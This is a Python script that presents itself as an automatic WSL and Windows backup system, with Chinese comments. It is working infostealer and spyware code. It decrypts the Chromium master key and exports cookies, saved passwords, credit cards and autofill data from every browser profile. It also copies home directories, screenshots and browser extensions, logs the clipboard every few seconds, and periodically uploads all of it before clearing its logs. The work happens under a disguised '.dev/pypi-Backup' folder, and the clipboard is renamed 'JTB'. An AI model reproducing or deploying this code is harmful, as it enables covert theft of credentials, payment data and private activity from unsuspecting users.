                    $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
                    Add-Type -AssemblyName System.Security
                    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    [Convert]::ToBase64String($masterKey)
                    """
                    
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        capture_output=True,
                        text=True
                    )
                    
                    if result.returncode == 0 and result.stdout.strip():
                        master_key = base64.b64decode(result.stdout.strip())
                        # 将 Master Key 编码为 base64 以便保存
                        master_key_b64 = result.stdout.strip()
                    else:
                        logging.debug(f"获取 {browser_name} Master Key 失败: PowerShell 返回码 {result.returncode}")
                except Exception as e:
                    logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
                        cookies_path = os.path.join(item_path, "Network", "Cookies")
                        if not os.path.exists(cookies_path):
                            cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        web_data_path = os.path.join(item_path, "Web Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                continue
            
            if not profiles:
                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
                continue
            
            # 为每个 Profile 导出数据
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  📂 处理 Profile: {profile_name}")
                
                cookies, passwords, web_data = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"])
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "✅" if master_key_b64 else "⚠️"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
        
        # 加密保存
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # 保存到文件
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_browser_exports"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_file = output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("✅ 浏览器数据导出成功")
        return str(output_file)
        
    except Exception as e:
        logging.error(f"❌ 浏览器数据导出失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    # 只处理备份日志文件
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # 复制日志文件到临时目录并上传
        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后保留最后一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的JTB上传线程"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # 检查文件内容是否为空或只包含上传记录
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # 检查是否只包含初始化标记或上传记录
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'JTB监控启动于' in line and 
                            not '日志已于' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("📋 JTB内容为空或无效，跳过上传")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # 创建临时目录
                username = getpass.getuser()
                user_prefix = username[:5] if username else "user"
                temp_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # 创建带时间戳的备份文件名
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # 复制日志文件到临时目录
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("📄 准备上传JTB日志...")
                    except Exception as e:
                        logging.error(f"❌ 复制JTB日志失败: {e}")
                        continue
                    
                    # 上传日志文件
                    if backup_manager.upload_file(str(backup_path)):
                        # 上传成功后清空原始日志文件
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("✅ JTB日志已清空")
                        except Exception as e:
                            logging.error(f"🧹 JTB日志清空失败: {e}")
                    else:
                        logging.error("❌ JTB日志上传失败")
                    
                    # 清理临时目录
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"❌ 清理临时目录失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理JTB日志时出错: {e}")
            
        # 等待20分钟
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = Path.home() / ".dev/pypi-Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # 需要保留的文件
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = [
            "backup.log",           # 备份日志
            f"{user_prefix}_clipboard_log.txt",    # JTB日志
            "next_backup_time.txt"  # 时间阈值文件
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    if not is_wsl():
        logging.critical("本脚本仅适用于 WSL 环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 启动时清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"❌程序出错: {e}")

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    user = get_username()
    
    # WSL备份路径
    wsl_source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    wsl_target = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_wsl"
    clipboard_log_path = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_clipboard_log.txt"
    
    # 启动双向JTB监控线程
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # 启动JTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("❌ 初始化JTB日志失败")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取WSL详细信息
    try:
        with open("/proc/version", "r") as f:
            wsl_version = f.read().strip()
            # 提取WSL版本号
            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
                system_info["WSL版本"] = "WSL2"
            elif "Microsoft" in wsl_version:
                system_info["WSL版本"] = "WSL1"
    except:
        system_info["WSL版本"] = "未知"
    
    # 获取Linux发行版信息
    try:
        with open("/etc/os-release", "r") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                    break
    except:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    while True:
        try:
            # 检查是否应该执行备份
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\n⏳ 当前时间: {current_time}")
                logging.critical(f"⌛ 下次备份: {next_time_str}")
            else:
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)
                
                # 执行备份任务
                logging.critical("\n🐧 WSL备份")
                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                
                logging.critical("\n🪟 Windows数据备份")
                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                
                # 合并所有备份路径
                all_backup_paths = wsl_backup_paths + windows_data_backup_paths
                
                # 保存下次备份时间
                next_backup_time = backup_manager.save_next_backup_time()
                
                # 输出结束语（在上传之前）
                has_backup_files = len(all_backup_paths) > 0
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
                
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
                    logging.critical("="*40 + "\n")
                
                # 开始上传备份文件
                if all_backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("✅ 所有备份文件上传成功")
                    else:
                        logging.error("❌ 部分备份文件上传失败")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            # 每小时检查一次
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("❌ 日志备份失败")
            time.sleep(60)  # 出错后等待1分钟再重试

def backup_wsl(backup_manager, source, target):
    """备份WSL目录，返回备份文件路径列表（不执行上传）"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            logging.critical("☑️ WSL目录备份文件已准备完成")
            return backup_path if isinstance(backup_path, list) else [backup_path]
        else:
            logging.error("❌ WSL目录压缩失败")
            return None
    return None


def backup_windows_data(backup_manager, user):
    """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
    backup_paths = []
    
    # 直接复制指定的 Windows 目录和文件（桌面、便签、历史记录等）
    user_prefix = user[:5] if user else "user"
    windows_base_path = f"/mnt/c/Users/{user}"
    specified_backup_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_windows_specified"
    
    if os.path.exists(windows_base_path):
        if backup_manager._ensure_directory(str(specified_backup_dir)):
            files_count = 0
            total_size = 0
            
            for item in backup_manager.config.WINDOWS_SPECIFIC_PATHS:
                source_path = os.path.join(windows_base_path, item)
                if not os.path.exists(source_path):
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"跳过不存在的项目: {source_path}")
                    continue
                
                try:
                    if os.path.isdir(source_path):
                        # 复制目录
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path, ignore_errors=True)
                            shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                            dir_size = backup_manager._get_dir_size(target_path)
                            files_count += 1
                            total_size += dir_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"成功复制目录: {item}")
                    else:
                        # 复制文件
                        target_path = os.path.join(specified_backup_dir, item)
                        parent_dir = os.path.dirname(target_path)
                        if backup_manager._ensure_directory(parent_dir):
                            shutil.copy2(source_path, target_path)
                            file_size = os.path.getsize(target_path)
                            files_count += 1
                            total_size += file_size
                            if backup_manager.config.DEBUG_MODE:
                                logging.debug(f"成功复制文件: {item}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.debug(f"复制失败: {item} - {str(e)}")
            
            if files_count > 0:
                logging.info(f"\n📊 Windows指定文件备份完成:")
                logging.info(f"   📁 文件数量: {files_count}")
                logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
                
                backup_path = backup_manager.zip_backup_folder(
                    str(specified_backup_dir),
                    str(Path.home() / f".dev/pypi-Backup/{user_prefix}_wsl_wins_specified_") + datetime.now().strftime("%Y%m%d_%H%M%S")
                )
                if backup_path:
                    if isinstance(backup_path, list):
                        backup_paths.extend(backup_path)
                    else:
                        backup_paths.append(backup_path)
                    logging.critical("☑️ Windows指定目录和文件备份文件已准备完成\n")
                else:
                    logging.error("❌ Windows指定目录和文件压缩失败\n")
            else:
                logging.error("❌ 未找到需要备份的Windows指定文件")
    
    # 备份截图
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / f".dev/pypi-Backup/{user_prefix}_screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 截图文件备份文件已准备完成\n")
    else:
        logging.info("ℹ️ 未发现可备份的截图文件\n")

    # 备份浏览器扩展数据
    extensions_backup = backup_browser_extensions(backup_manager, user)
    if extensions_backup:
        backup_path = backup_manager.zip_backup_folder(
            extensions_backup,
            str(Path.home() / f".dev/pypi-Backup/{user_prefix}_browser_extensions_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if isinstance(backup_path, list):
                backup_paths.extend(backup_path)
            else:
                backup_paths.append(backup_path)
            logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
    
    # 导出浏览器 Cookies 和密码
    browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
    if browser_export_file:
        backup_paths.append(browser_export_file)
        logging.critical("☑️ 浏览器数据导出文件已准备完成\n")
    else:
        logging.warning("⏭️  浏览器数据导出跳过或失败\n")
    
    return backup_paths

def get_wsl_clipboard():
    """获取WSL/Linux JTB内容（使用xclip）"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """设置WSL/Linux JTB内容（使用xclip）"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """设置Windows JTB内容（通过powershell）"""
    try:
        if content is None:
            return False

        # 容忍 bytes 输入，统一转为 str，避免编码异常
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # 使用 Base64 传递文本，避免转义/换行/特殊字符导致 PowerShell 解析错误
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        # 使用参数列表避免 shell 解析问题，且保持字节模式防止编码异常
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"❌ 设置Windows JTB失败: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"❌ 设置Windows JTB出错: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """双向监控WSL和Windows JTB并记录/同步"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'JTB监控启动于' in text or '日志已于' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # 同步到WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # 同步到Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"❌ JTB双向监控出错: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()